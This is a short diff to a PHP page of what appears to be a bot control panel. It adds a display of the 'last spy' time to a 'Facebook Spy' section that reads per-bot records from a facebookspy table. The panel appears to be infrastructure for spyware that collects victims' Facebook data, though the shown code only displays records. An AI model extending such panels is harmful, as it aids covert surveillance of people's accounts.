@@ -31,6 +31,9 @@ $z_name = $bot->bot_id;
     </div>
     <div class="ui segment">
         <h3>Facebook Spy</h3>
+        <small><?php echo Bot::getLastSpy($_GET['id']); ?></small>
+        <br />
+        <br />
         <?php
         $select = $bdd->prepare("SELECT * FROM facebookspy WHERE bot_id = :bot_id");
         $select->bindParam(':bot_id', $_GET['id']);
